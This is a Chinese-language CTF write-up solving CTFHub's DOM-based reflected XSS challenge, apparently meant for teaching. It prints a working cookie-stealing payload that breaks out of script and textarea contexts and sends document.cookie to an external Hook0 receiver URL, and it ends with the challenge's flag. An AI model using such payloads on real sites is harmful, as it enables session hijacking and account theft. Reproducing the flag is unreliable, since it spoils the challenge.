---
title: CTFHub-XSS-DOM反射 Writeup
date: 2026-10-03
category: Web
tags: [CTFHub, XSS, DOM]
---
## 题目概述

· 靶场环境：CTFHub - 技能树 - XSS - DOM反射（XSS DOM Reflex）
· 漏洞成因：网页前端 JavaScript 会动态获取 URL 中的参数（如 ?text=...），并在未进行安全过滤的情况下，直接将其拼接到 HTML 页面中。由于是前端 JS 处理的输出，不经过服务器，因此被称为 DOM 型 XSS。
· 通关目标：利用该漏洞构造恶意链接，发送给靶场的模拟机器人（Bot），窃取机器人的 Cookie，从而获取 Flag。

## 知识点

1. DOM 型 XSS：不依赖服务器端响应，完全由浏览器端的 JS 渲染导致。
2. HTML/JS 上下文闭合：利用单引号、双引号或闭合标签（如 </textarea>, </script>）来打破原有代码结构。
3. Cookie 窃取：利用 JavaScript 的 document.cookie 属性读取当前页面的 Cookie。
4. 数据外带（OOB）：使用 new Image().src 或 fetch() 发起请求，将窃取到的数据发送到攻击者控制的服务器。
5. XSS 接收平台：Hook0 平台（https://play.hook0.com），用于接收盲打或者反射型 XSS 产生的回传数据。

## 解题步骤

### 1. 准备接收平台

· 登录 Hook0 平台，创建一个项目（或使用现有的项目）。
· 获取你的专属接收链接，例如：https://play.hook0.com/in/c_HZL1Y57TDiUFlLfFzCwQIAxPQUK/

### 2. 构造 XSS Payload

在靶场主页的 Change text 输入框中，输入以下 Payload（注意替换为你自己的 Hook0 链接）：

html
';</script></textarea>'"<script>new Image().src="https://play.hook0.com/in/c_HZL1Y57TDiUFlLfFzCwQIAxPQUK/?c="+document.cookie;</script>

### 3. 生成并复制恶意链接

· 在输入框提交 Payload 后，页面地址栏中的 URL 会更新，例如变成类似 http://challenge-xxx.sandbox.ctfhub.com:10800/?text=%27%3C%2Fscript...。
· 全选并复制地址栏中完整的、包含你 Payload 的 URL。

### 4. 发送给机器人（Bot）

· 在靶场页面下方找到 Send URL to Bot 输入框。
· 将刚才复制的完整 URL 粘贴进去，点击 Send 按钮。

### 5. 获取 Flag

· 等待 10-30 秒（给机器人留出访问和触发脚本的时间）。
· 回到 Hook0 平台页面，刷新，查看 Requests / Events 日志。
· 点开最新的一条请求记录，在 URL 参数（Query Parameters）中查找 c= 后面的值。
· 这个值就是机器人的 Cookie，里面通常包含 flag=ctfhub{...} 的字段。提取出来回到靶场提交即可。

## Flag
ctfhub{9a9490d6299a5046379ad34c}

